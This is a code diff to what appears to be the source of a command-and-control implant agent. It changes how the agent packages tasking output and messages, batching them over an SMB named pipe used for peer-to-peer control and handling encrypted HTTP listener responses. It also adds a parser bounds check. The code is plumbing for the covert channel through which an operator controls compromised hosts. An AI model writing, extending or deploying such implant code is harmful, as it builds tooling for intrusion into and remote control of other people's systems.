@@ -723,22 +723,27 @@ auto DECLFN Package::Transmit(
     Self->Mm->Free( EncBuffer, TotalPacketLen, MEM_RELEASE );
     
     if ( Success && RecvData.Ptr && RecvData.Size ) {
-        UCHAR* DecryptBuff   = RecvData.Ptr + EncryptOffset;
-        ULONG  DecryptLength = (ULONG)RecvData.Size - EncryptOffset;
 
-        if ( DecryptLength == 0 ) { 
-            KhDbg("Invalid decrypt length: %lu", DecryptLength);
-            if ( RecvData.Ptr ) KhFree( RecvData.Ptr );
-            return FALSE;
+        // HTTP: response is encrypted by the HTTP listener with LokyCrypt
+        // SMB: response is plaintext (server Encrypt/Decrypt are no-ops)
+        if ( ! Self->Tsp->Pipe.Name && RecvData.Size > EncryptOffset ) {
+            UCHAR* DecryptBuff   = RecvData.Ptr + EncryptOffset;
+            ULONG  DecryptLength = (ULONG)RecvData.Size - EncryptOffset;
+
+            if ( DecryptLength > 0 ) {
+                Self->Crp->Decrypt( DecryptBuff, DecryptLength );
+            }
         }
 
-        Self->Crp->Decrypt( DecryptBuff, DecryptLength );
-         
-        *Response = RecvData.Ptr;
-        *Size     = RecvData.Size;
-        
+        if ( Response && Size ) {
+            *Response = RecvData.Ptr;
+            *Size     = RecvData.Size;
+        } else {
+            KhFree( RecvData.Ptr );
+        }
+
         Success = TRUE;
-    } else if ( RecvData.Ptr ) {        
+    } else if ( RecvData.Ptr ) {
         KhFree( RecvData.Ptr );
         Success = FALSE;
     }
@@ -812,6 +817,18 @@ auto DECLFN Package::SendOut(
     _In_ BYTE* Buffer,
     _In_ INT32 Length
 ) -> BOOL {
+    // SMB: append to PostJobs as MSG_OUT entry instead of calling Transmit
+    // (batching avoids interleaved writes on the persistent pipe)
+    if ( Self->Tsp->Pipe.Name && Self->Jbs->PostJobs ) {
+        this->Int32( Self->Jbs->PostJobs, (INT32)Action::Task::QuickOut );
+        this->Pad( Self->Jbs->PostJobs, (UCHAR*)Self->Jbs->CurrentUUID, 36 );
+        this->Int32( Self->Jbs->PostJobs, CmdID );
+        this->Int32( Self->Jbs->PostJobs, Type );
+        this->Bytes( Self->Jbs->PostJobs, Buffer, Length );
+        Self->Jbs->QuickCount++;
+        return TRUE;
+    }
+
     PACKAGE* Package = (PACKAGE*)KhAlloc( sizeof( PACKAGE ) );
 
     Package->Buffer = PTR( KhAlloc( sizeof( BYTE ) ) );
@@ -882,16 +899,25 @@ auto DECLFN Package::FmtMsg(
     this->Pad(Package, (PUCHAR)Self->Session.AgentID, 36);
     this->Byte(Package, (BYTE)Action::Task::QuickMsg);
 
-    if (PROFILE_C2 == PROFILE_SMB) {
-        // this->Pad(Package, (PUCHAR)SmbUUID, 36);
-    }
-
     this->Pad(Package, (PUCHAR)Self->Jbs->CurrentUUID, 36);
     this->Int32(Package, Type);
 
     this->Str(Package, MsgBuff);
 
-    result = this->Transmit(Package, nullptr, 0);
+    // SMB: append to PostJobs as MSG_QUICK entry instead of calling Transmit
+    // (batching avoids interleaved writes on the persistent pipe)
+    if ( Self->Tsp->Pipe.Name ) {
+        if ( Self->Jbs->PostJobs ) {
+            this->Int32( Self->Jbs->PostJobs, (INT32)Action::Task::QuickMsg );
+            this->Pad( Self->Jbs->PostJobs, (UCHAR*)Self->Jbs->CurrentUUID, 36 );
+            this->Int32( Self->Jbs->PostJobs, Type );
+            this->Str( Self->Jbs->PostJobs, MsgBuff );
+            Self->Jbs->QuickCount++;
+        }
+        result = TRUE;
+    } else {
+        result = this->Transmit(Package, nullptr, 0);  // HTTP: send QuickMsg separately
+    }
 
 _KH_END:
 
@@ -908,6 +934,16 @@ auto DECLFN Package::SendMsgA(
     _In_ ULONG Type,
     _In_ CHAR* Message
 ) -> BOOL {
+    // SMB: append to PostJobs as MSG_QUICK entry instead of calling Transmit
+    if ( Self->Tsp->Pipe.Name && Self->Jbs->PostJobs ) {
+        this->Int32( Self->Jbs->PostJobs, (INT32)Action::Task::QuickMsg );
+        this->Pad( Self->Jbs->PostJobs, (UCHAR*)Self->Jbs->CurrentUUID, 36 );
+        this->Int32( Self->Jbs->PostJobs, Type );
+        this->Str( Self->Jbs->PostJobs, Message );
+        Self->Jbs->QuickCount++;
+        return TRUE;
+    }
+
     PACKAGE* Package = (PACKAGE*)KhAlloc( sizeof( PACKAGE ) );
 
     Package->Buffer = PTR( KhAlloc( sizeof( BYTE ) ) );
@@ -915,10 +951,6 @@ auto DECLFN Package::SendMsgA(
 
     this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
     this->Byte( Package, (BYTE)Action::Task::QuickMsg );
-
-    if ( PROFILE_C2 == PROFILE_SMB ) {
-        // this->Pad( Package, (PUCHAR)SmbUUID, 36 );
-    }
 
     this->Pad( Package, (UCHAR*)Self->Jbs->CurrentUUID, 36 );
     this->Int32( Package, Type );
@@ -935,6 +967,16 @@ auto DECLFN Package::SendMsgW(
     _In_ ULONG  Type,
     _In_ WCHAR* Message
 ) -> BOOL {
+    // SMB: append to PostJobs as MSG_QUICK entry instead of calling Transmit
+    if ( Self->Tsp->Pipe.Name && Self->Jbs->PostJobs ) {
+        this->Int32( Self->Jbs->PostJobs, (INT32)Action::Task::QuickMsg );
+        this->Pad( Self->Jbs->PostJobs, (UCHAR*)Self->Jbs->CurrentUUID, 36 );
+        this->Int32( Self->Jbs->PostJobs, Type );
+        this->Wstr( Self->Jbs->PostJobs, Message );
+        Self->Jbs->QuickCount++;
+        return TRUE;
+    }
+
     PACKAGE* Package = (PACKAGE*)KhAlloc( sizeof( PACKAGE ) );
 
     Package->Buffer = PTR( KhAlloc( sizeof( WCHAR ) ) );
@@ -942,10 +984,6 @@ auto DECLFN Package::SendMsgW(
 
     this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
     this->Byte( Package, (BYTE)Action::Task::QuickMsg );
-
-    if ( PROFILE_C2 == PROFILE_SMB ) {
-        // this->Pad( Package, (PUCHAR)SmbUUID, 36 );
-    }
 
     this->Pad( Package, (UCHAR*)Self->Jbs->CurrentUUID, 36 );
     this->Int32( Package, Type );
@@ -1043,10 +1081,16 @@ auto DECLFN Parser::Bytes(
     if ( this->Endian )
         Length = __builtin_bswap32( Length );
 
+    // Bounds check: Length must fit within remaining parser data
+    if ( Length > parser->Length - 4 ) {
+        if ( size != NULL ) *size = 0;
+        return NULL;
+    }
+
     outdata = B_PTR( parser->Buffer );
     if ( outdata == NULL )
         return NULL;
-        
+
     parser->Length -= 4;
     parser->Length -= Length;
     parser->Buffer += Length;
